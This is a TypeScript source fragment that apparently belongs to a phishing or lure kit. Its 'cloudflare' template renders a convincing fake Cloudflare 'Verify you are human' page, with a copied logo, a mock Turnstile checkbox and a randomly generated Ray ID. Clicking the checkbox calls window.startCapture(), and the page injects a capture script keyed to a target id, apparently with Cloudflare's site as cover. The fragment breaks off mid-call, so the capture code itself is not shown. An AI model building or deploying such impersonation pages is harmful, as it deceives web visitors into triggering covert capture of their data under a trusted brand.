...
export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  ...
  'cloudflare': {
    ...
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#ffffff; color: #000000; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 150px; height: auto; margin-bottom: 40px; } .main-text { font-size: 32px; font-weight: 400; line-height: 1.25; margin-bottom: 12px; color: #1d1d1d; } .sub-text { font-size: 16px; color: #313131; margin-bottom: 40px; line-height: 1.5; } .turnstile-box { border: 1px solid #d9d9d9; border-radius: 4px; padding: 12px; display: inline-flex; align-items: center; background: #f9f9f9; cursor: pointer; transition: background 0.2s; min-width: 300px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); } .turnstile-box:hover { background: #f0f0f0; } .checkbox { width: 28px; height: 28px; border: 2px solid #f6821f; border-radius: 4px; margin-right: 12px; position: relative; background: #fff; display: flex; align-items: center; justify-content: center;} .turnstile-text { font-size: 14px; color: #313131; font-weight: 500; flex-grow: 1; } .footer { font-size: 13px; color: #999; margin-top: 80px; border-top: 1px solid #eeeeee; padding-top: 20px; width: 100%; display: flex; justify-content: space-between; } .footer a { color: #0051c3; text-decoration: none; } .spinner { display: none; width: 20px; height: 20px; border: 2px solid rgba(0,0,0,0.1); border-radius: 50%; border-top-color: #f6821f; animation: spin 0.8s linear infinite; margin-left: 10px; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verify you are human by completing the action below.</div><div class="sub-text">Verification is required to protect the website from automated attacks.</div><div class="turnstile-box" onclick="this.style.pointerEvents='none'; document.getElementById('spinner').style.display='block'; window.startCapture();"><div class="checkbox"></div><div class="turnstile-text">Verify you are human</div><div class="spinner" id="spinner"></div></div><div class="footer"><div>Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span></div><div>Performance & security by <a href="#">Cloudflare</a></div></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
